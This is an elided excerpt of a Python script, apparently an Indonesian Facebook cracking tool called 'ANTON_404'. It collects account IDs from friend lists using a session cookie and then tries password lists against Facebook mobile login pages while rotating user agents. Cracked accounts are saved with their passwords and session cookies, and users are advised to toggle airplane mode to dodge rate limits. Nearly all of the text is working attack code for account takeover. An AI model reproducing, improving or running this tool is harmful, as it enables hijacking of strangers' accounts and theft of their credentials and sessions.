...
for generate in range(10):
	...
	uaku=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
def uaku():
	try:
...
def banner():
      ...
      print(f'''{kun}
    ___    _   ____________  _   __   ________  ______  __  ________
   /   |  / | / /_  __/ __ \/ | / /  /_  __/ / / / __ \/  |/  /__  /
  / /| | /  |/ / / / / / / /  |/ /    / / / /_/ / / / / /|_/ /  / / 
 / ___ |/ /|  / / / / /_/ / /|  /    / / / __  / /_/ / /  / /  / /__
...
def login_lagi334():
	try:
		...
		os.system('clear')
		cookie=input(f'  [{h}•{x}]LOGIN COOKIE :D :{asu} ')
...
def menu():
	...
	try:
		...
		login3()
		banner()
	prints(panel(f"""[cyan][[cyan]1[cyan]] CRACK PUBLIK [[green] ON [cyan]] \n[[cyan]2[cyan]] CRACK MASALL [cyan][[green] ON [cyan]]  """,width=43,title=f"[[green] ANTON_404 [/]]",style=f"bold white"))
	print(f"{biru}╭────────────────────────────────────────────{puti}")
	ANTON_404 = input(f'{biru}└──[{kun} >> Pilih Menu : ')
...
def dump_massal():
	try:
	    ...
	    exit()
	try:
		kumpulkan = int(input(f' brapa total id ? : '))
	except ValueError:
	    exit()
	...
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		prints(panel(f'[hijo]MASUKAN ID SESUAI JUMLAH ',width=43,title=f"[[green] ANTON_404 [/]]",style=f"bold white"))
...
def dump(idt,fields,cookie,token):
	try:
		...
		for i in url["friends"]["data"]:
			...
			sys.stdout.write(f"\r{hijo}>> sukses mengumpulkan {H}{len(id)}{P} id akun.{P}"),
			sys.stdout.flush()
...
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('ANTON_404-OK')
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('ANTON_404-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
		...
		try:lin = open('ANTON_404-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{biru}╭────────────────────────────────────────────{puti}")
...
#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('ANTON_404-CP')
	except FileNotFoundError:
		print(f"{biru}╭────────────────────────────────────────────{puti}")
		exit(f"{biru}└──[{kun} File tidak di temukan ")
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('ANTON_404-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
		    ...
		    print(f"{biru}╭────────────────────────────────────────────{puti}")
		    exit(f"{biru}└──[{kun} Pilih yang bener :-( ")
		try:lin = open('ANTON_404-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{biru}└──[{kun} File tidak di temukan ")
		nocp=0
...
def atur_method():
	print("")
	print(f'{biru}└──[{hijo} 01. m.prod.facebook.com {hijo}[ ON ]')
	print(f'{biru}└──[{kun} 02. m.facebook.com {hijo}[ ON ]')
	print(f'{biru}└──[{mer} 03. m.alpha.facebook.com {kun}[ not update ]')      
	print(f"{biru}╭────────────────────────────────────────────{biru}") 
	CYXIEON_METHODE = input(f'{biru}└──[{kun} Pilih Method : ')
	if CYXIEON_METHODE in ['1','01']:
	   ...
	   method.append('asyinc')
		...
		method.append('validate')
	print(f"{biru}╭────────────────────────────────────────────{biru}")
	print(f'{biru}└──[{kun} Apakah Ingin Menambahkan Pw manual?? (y/t) ')
	print(f"{biru}╭────────────────────────────────────────────{biru}") 	
	passwtamb = input(f'{biru}└──[{kun} Pilih y jika ingin menambahkan : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{biru}╭────────────────────────────────────────────{hijo}")
		     sandiku = input(f'{biru}└──[{kun} Masukan Pw manual : ')
...
def passwordlist():
	global prog,des
	print(f"{biru}╭────────────────────────────────────────────{hijo}")
	print(f'{hijo} └──[{kun}ON/OFF MODE PESAWAT SETIAP 600 IDS ')
	print(f'{hijo} └──[{kun}SABAR JIKA KAMU MENANG KUNING. KARNA SC GRATIS😅 ')
	print(f'{hijo} └──[{kun}JANGAN LUPA SHOLAT JANGAN CRACK MULU. ITU KUNCI NYA BIAR IJO ')
	print(f"{biru}─────────────────────────────────────────────{hijo}")
...
def crackvalidate(idf,pwx,url):
	...
	for pw in pwx:
		try:
			ua = rc(ugen)
			ua2 = ("Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.67 Safari/537.36 [FB_IAB/FB4A;FBAV/224.0.0.33.114;]")
		...
		'viewport-width': f'{str(rr(300,999))}',
	     ...
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f"{kun}╭────────────────────────────╮{puti}")
				print(f"\n{hijo}IDS AKUN: {hijo}{idf}{puti}")
				print(f"{hijo}PASWORD  : {hijo}{pw}{puti}")
				print(f"{hijo}TAHUN     : {mer}{tahun(idf)}{puti}")
				print(f"{hijo}COOKIE     : {hijo}{kuki}{puti}")
				print(f'{hijo}USER AGENT:{ua}')
				...
				print(f"\n{kun}⌲ User ID: {kun}{idf}{puti}")
				print(f"{kun}⌲ Password: {kun}{pw}{puti}")
...
def crackreguler(idf,pwx,url):
	...
	for pw in pwx:
		try:
			...
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Safari/537.36 [FB_IAB/FB4A;FBAV/260.0.0.42.118;]"]) 		
			ses.headers.update(
			{
			"Host":url,
			"upgrade-insecure-requests":"1",
...
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw})
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n>> IDS AKUN: {hijo}{idf}{puti}")
				print(f">> KATA SANDI: {hijo}{pw}{puti}")
				print(f">> TAHUN AKU: {hijo}{tahun(idf)}{puti}")
				...
				print(f"\n>> IDS AKUN: {mer}{idf}{puti}")
				print(f">> KATA SANDI: {mer}{pw}{puti}")
				print(f">> TAHUN AKU: {mer}{tahun(idf)}{puti}")
				print(f'{hijo}{ua}')
				open('ANTON_404-CP/'+'ANTON_404-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
...
def crackasyinc(idf,pwx):
  ...
  for pw in pwx:
    try:
      ...
      ua = rc(ugen)
      ua2 = rc(["Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Safari/537.36 [FB_IAB/FB4A;FBAV/262.0.0.34.117;]"])
...
'fb_dtsg',
	'submit[Continue]',
		...
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{hijo}LOGIN NOT SUPPORT DI FACEBOOK LITE/MBASIC{puti}")
			prints(tree)
			open('ANTON_404-CP/'+'ANTON_404-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
			#cp+=1
		else:
...
if __name__=='__main__':
	...
	try:os.mkdir('ANTON_404-OK')
	except:pass
	try:os.mkdir('ANTON_404-CP')
	except:pass
	menu()
